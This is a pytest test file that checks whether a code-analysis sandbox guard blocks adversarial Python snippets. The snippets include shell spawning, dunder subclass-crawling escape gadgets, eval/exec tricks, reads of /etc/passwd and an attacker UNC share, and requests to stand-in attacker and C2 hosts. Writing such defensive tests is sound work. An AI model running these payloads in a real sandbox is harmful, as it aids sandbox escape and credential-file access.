"""Adversarial Security Penetration & Sandbox Red-Teaming Suite.

Inspired by Anthropic and OpenAI Code Interpreter sandbox red-teaming harnesses.
Validates that CodeGuard's AST analyzer and sandbox containment policies
block 100% of malicious execution, reflection, dunder traversal, and escape attempts.
"""

from __future__ import annotations

import pytest

from src.core.security.code_guard import CodeGuard


class TestAdversarialSecurityPenetration:
    """Comprehensive red-teaming test suite for AST code analysis and containment."""

    @pytest.mark.parametrize(
        "payload,expected_flag",
        [
            # 1. System calls and process spawning
            ("import os\nos.system('whoami')", "os"),
            ("import subprocess\nsubprocess.run(['ls', '-la'])", "subprocess"),
            ("import posix\nposix.system('id')", "system"),
            ("import pty\npty.spawn('/bin/sh')", "pty"),
            # 2. Dynamic reflection and attribute obfuscation
            ("getattr(pd, 'r' + 'ead_csv')('data.csv')", "computed"),
            ("setattr(pd, 'read_' + 'csv', None)", "computed"),
            ("hasattr(pd, '__' + 'class__')", "computed"),
            ("getattr(object, '__class__')", "__class__"),
            # 3. Dunder subclass crawling & sandbox breakout gadgets
            ("().__class__.__bases__[0].__subclasses__()", "__bases__"),
            ("[].__class__.__base__.__subclasses__()", "__base__"),
            ("x = __builtins__\nx['eval']('1+1')", "__builtins__"),
            ("x = __loader__", "__loader__"),
            ("x = __spec__", "__spec__"),
            # 4. Code execution and compilation builtins
            ('eval(\'__import__("os").system("ls")\')', "eval"),
            ("exec('import sys; sys.exit(1)')", "exec"),
            ("compile('print(1)', '<string>', 'exec')", "compile"),
            ("__import__('os').system('ls')", "__import__"),
            # 5. Dangerous filesystem traversal and UNC paths
            ("open('/etc/passwd', 'r')", "outside the workspace"),
            ("open('C:/Windows/System32/drivers/etc/hosts', 'r')", "outside the workspace"),
            ("pd.read_csv('../../root_secret.txt')", "outside the workspace"),
            ("pd.read_csv('\\\\\\\\attacker-server\\\\share\\\\malicious.csv')", "outside the workspace"),
            ("open('C:\\\\Windows\\\\System32\\\\cmd.exe', 'rb')", "outside the workspace"),
            # 6. Raw network socket creation
            ("import socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)", "socket"),
            ("import urllib.request\nurllib.request.urlopen('https://malicious-c2.com')", "urllib"),
            ("import http.client\nconn = http.client.HTTPSConnection('example.com')", "http"),
            ("import requests\nrequests.get('http://attacker.com')", "requests"),
        ],
    )
    def test_adversarial_payloads_strictly_blocked(self, payload: str, expected_flag: str):
        """Every adversarial exploit payload must be trapped and rejected before execution."""
        verdict = CodeGuard.scan(payload, extra_roots=("/workspace",))
        assert not verdict.ok, f"Payload was allowed through guard: {payload}"
        all_violations = " ".join(verdict.violations).lower()
        assert expected_flag.lower() in all_violations, (
            f"Expected '{expected_flag}' in violations '{verdict.violations}'"
        )

    def test_benign_analytical_operations_allowed(self):
        """Safe data science and machine learning operations must not false-positive."""
        benign_code = """
import pandas as pd
import numpy as np
import polars as pl
import duckdb
import scipy.stats as stats
import sklearn.cluster as cluster

# Safe in-workspace data analysis
df = pd.DataFrame({'a': [1, 2, 3], 'b': [4, 5, 6]})
df['sum'] = df['a'] + df['b']
z_scores = stats.zscore(df['a'])
pl_df = pl.from_pandas(df)
con = duckdb.connect(':memory:')
con.register('data', df)
summary = con.execute('SELECT AVG(a) FROM data').fetchone()
"""
        verdict = CodeGuard.scan(benign_code, extra_roots=("/workspace",))
        assert verdict.ok, f"Benign analytics code was falsely blocked: {verdict.reason}"
